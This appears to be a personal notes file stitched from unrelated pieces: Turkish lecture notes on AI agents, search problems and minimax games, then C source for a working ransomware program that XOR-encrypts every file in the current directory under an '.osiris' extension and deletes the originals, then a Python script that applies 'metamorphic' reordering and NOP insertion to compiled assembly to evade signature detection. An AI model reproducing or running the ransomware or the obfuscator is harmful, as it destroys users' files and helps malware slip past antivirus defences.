Gerçek ortam = inaccesible, dynamic, continous, stochastic
Ajanın ortam = accesible, static, discrete, deterministic

* Mimari = Sensors + Actuators
* Ajan = Mimari + Program

Karmaşık ortamlarla başa çıkma becerisi : 
Arama tablosu ajanları > basit refleks ajanları > Model tabanlı refleks > Hedef tabanlı > Fayda tabanlı > Öğrenen

Problem çözme ajanları amaç temelli ajanlardır.

Arama problemi ve 5 Bileşen
1- Başlangıç durumu
2- Eylemler
3- Durum Uzayı = Başlangıç durumu + Eylemler + Geçiş modeli
4- Amaç testi
5- Maliyet

--> Çözüm, başlangıç durumunu bir hedef durumuna dönüştüren bir dizi eylemdir
--> Arama problemleri, başlangıç durumu ile amaç durumu arasındaki en uygun ve verimli yolu bulmayı amaçlar. Yapay zekada arama algoritmaları ile bu tür problemlere çözüm bulmaya çalışır.
--> YZ problemlerinin çoğunda durum uzayının ve çözüm ağacının gösterilmesinde graflar kullanılır.
--> Arama ağacındaki her DÜĞÜM, durum uzay grafındaki tam bir YOL'dur
--> YZ problemleri sonlu durumlar kümesinden oluşur.
--> Durum uzayı kümesi elemanları, Graf yapısı ile temsil edilir.
--> Durumlar, düğümler ile ifade edilir

! Büyük problemler alt probmlere bölünür ve alt problemler çözümleri keisn olan ve daha küçük parçalara ayrılamayan durumları ifade eder.
! Alt problemlere ayırma kullanılan çözümlerde, AND/OR ağacı kullanılır. 

--> Sonsuz durum uzaylarında derinlik öncelikli arama başarısızlığa düşüyor. Derinlik SInırla arama imdada yetişiyor. DFS de derinlik sınırı sonsuzdur. Bu problemdir.

Analiz + Strateji + Taktik = Hamle

3 ana oyun kategorisi
Rastgele Sonuçlu
Ustalık Gerektiren
Stratejik

 Kesin belirlenmiş oyun = Kazanç matrisinde minimax noktası olan oyun
 Minimaks 0 olan oyun = Dürüst Oyun

 MAX gidişler VEYA düğümlerine
 MIN ise VE düğümlerine uygun gelmektedir.


--------------------------

#include <dirent.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <libgen.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

#define RANSOMED_EXT ".osiris"
#define CHARSET "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
#define KEY_LEN 32

#define DBG

const char *never_displayed = "Rw by [afjoseph]";

void rand_str(char *dest, size_t size) {
    for (size_t n = 0; n < size; n++) {
        int key = rand() % (int)(sizeof CHARSET - 1);
        dest[n] = CHARSET[key];
    }
    dest[size] = '\0';
}

void encrypt_block(uint8_t *ret_char, uint8_t char_to_xor, int counter,
                   const uint8_t *key, size_t len_key) {
    uint8_t key_char = key[counter % len_key];
    *ret_char = char_to_xor ^ key_char;

#ifdef DBG
    printf("counter     = %d\n", counter);
    printf("key_char    = 0x%02x\n", key_char);
    printf("byte_to_xor = 0x%02x\n", char_to_xor);
    printf("ret_char    = 0x%02x\n", *ret_char);
#endif
}

int is_filename_proper(const char *filename) {
    if (strcmp(".", filename) == 0 || strcmp("..", filename) == 0) {
        return 1;
    }

    if (strstr(filename, "rw") != 0 ||
        strstr(filename, ".osiris") != 0) {
        return 1;
    }

    return 0;
}

void encrypt_file(const char *orig_filepath, const uint8_t *key,
                  size_t len_key) {
    char *bname;
    char *new_filepath;
    int origfile_fd, newfile_fd;
    struct stat st;
    int i;
    uint8_t *mem, *newmem;

    bname = basename((char *)orig_filepath);

    if (is_filename_proper(bname) != 0) {
        return;
    }

    if ((origfile_fd = open(orig_filepath, O_RDONLY)) < 0) {
        fprintf(stderr, "[!] open failed %s\n", orig_filepath);
        return;
    }

    if (fstat(origfile_fd, &st) < 0) {
        fprintf(stderr, "[!] fstat failed %s\n", orig_filepath);
        return;
    }

    new_filepath = strdup(orig_filepath);
    strcat(new_filepath, RANSOMED_EXT);
#ifdef DBG
    printf("new filepath: %s\n", new_filepath);
#endif

    if ((newfile_fd = open(new_filepath, O_WRONLY | O_CREAT | O_TRUNC)) < 0) {
        fprintf(stderr, "[!] open failed %s\n", new_filepath);
        return;
    }

    fchmod(newfile_fd, st.st_mode);

    mem = (uint8_t *)mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, origfile_fd,
                          0);
    if (mem == MAP_FAILED) {
        fprintf(stderr, "[!] mmap failed\b");
        return;
    }

    newmem = (uint8_t *)alloca(st.st_size);

#ifdef DBG
    printf("\torig_filepath: %s\n", orig_filepath);
    printf("\tsize of file %ld\n", st.st_size);
    printf("\tfirst 4 bytes:\n");
    for (i = 0; i < 4; i++) {
        printf("\t%d: %02x\n", i, mem[i]);
    }

    printf("\tLast byte:\n");
    printf("\t%ld: %02x\n", st.st_size, mem[st.st_size - 2]);
    printf("\n");
#endif

    for (i = 0; i < st.st_size; i++) {
        encrypt_block(&newmem[i], mem[i], i, key, len_key);
#ifdef DBG
        printf("\rprogress: %ld\r", (i / st.st_size) * 100);
#endif
    }

    if ((write(newfile_fd, newmem, st.st_size)) <= 0) {
        fprintf(stderr, "[!] write failed %s", new_filepath);
        return;
    }

    remove(orig_filepath);

    close(newfile_fd);
    close(origfile_fd);
}

int main(int argc, char **argv) {
    DIR *d;
    struct dirent *dir;
    char *key;

    key = (char *) alloca(KEY_LEN * sizeof(char));
    rand_str(key, KEY_LEN);

#ifdef DBG
    printf("key is: %s\n", key);
#endif

    d = opendir(".");
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            encrypt_file(dir->d_name, (const uint8_t *)key, KEY_LEN);
        }

        closedir(d);
    }
}

--------------------------


import subprocess
import random
import os

def compile_c_to_assembly(c_file, assembly_file):
    subprocess.run(['gcc', '-S', c_file, '-o', assembly_file], check=True)

def read_assembly_file(file_path):
    with open(file_path, 'r') as file:
        lines = [line.strip() for line in file.readlines()]
    return lines

def insert_nop_instructions(assembly_lines):
    updated_lines = []
    nop_count = 0
    max_nops = 5

    for line in assembly_lines:
        updated_lines.append(line)
        if line and not line.startswith('.') and random.random() > 0.8 and nop_count < max_nops:
            nop_count_to_insert = random.randint(1, 2)
            if nop_count + nop_count_to_insert <= max_nops:
                for _ in range(nop_count_to_insert):
                    updated_lines.append('    nop')
                nop_count += nop_count_to_insert

    return updated_lines

def reorder_subroutines(assembly_lines):
    subroutine_blocks = []
    current_subroutine = []
    in_subroutine = False

    for line in assembly_lines:
        if line.endswith(':') and not line.startswith('.'):
            if current_subroutine:
                subroutine_blocks.append(current_subroutine)
            current_subroutine = [line]  
            in_subroutine = True
        elif in_subroutine:
            current_subroutine.append(line)
        else:
            subroutine_blocks.append([line])

    if current_subroutine:
        subroutine_blocks.append(current_subroutine)

    subroutine_blocks = random.sample(subroutine_blocks, len(subroutine_blocks))

    reordered_lines = [line for block in subroutine_blocks for line in block]
    
    return reordered_lines

def substitute_with_equivalents(assembly_lines):
    EQUIVALENT_INSTRUCTIONS = {
        "jmp .L27": [
            "mov $0, %eax\ntest %eax, %eax\njz .L27"
        ]
    }

    updated_lines = []
    for line in assembly_lines:
        stripped_line = line.strip()

        normalized_line = ' '.join(stripped_line.split())

        if normalized_line in EQUIVALENT_INSTRUCTIONS:
            equivalent = random.choice(EQUIVALENT_INSTRUCTIONS[normalized_line])
            updated_lines.append(equivalent)
        else:
            updated_lines.append(line)
    
    return updated_lines

def apply_metamorphism(assembly_lines):
    #assembly_lines = insert_nop_instructions(assembly_lines)   # Add NOP instructions
    assembly_lines = reorder_subroutines(assembly_lines)       # Reorder subroutines
    #assembly_lines = substitute_with_equivalents(assembly_lines)  # Use equivalent instructions
    return assembly_lines

def write_assembly_file(assembly_file, lines):
    with open(assembly_file, 'w') as file:
        for line in lines:
            file.write(line + '\n')

def compile_assembly_to_executable(assembly_file, executable_file):
    subprocess.run(['gcc', '-no-pie', assembly_file, '-o', executable_file, '-static'], check=True)

def main():
    c_file = "main.c"
    intermediate_assembly_file = "main.s"
    updated_assembly_file = "updates.s"
    executable_file = "executable"

    compile_c_to_assembly(c_file, intermediate_assembly_file)
    assembly_lines = read_assembly_file(intermediate_assembly_file)
    
    updated_assembly_lines = apply_metamorphism(assembly_lines)
    
    write_assembly_file(updated_assembly_file, updated_assembly_lines)
    compile_assembly_to_executable(updated_assembly_file, executable_file)

if __name__ == "__main__":
    main()
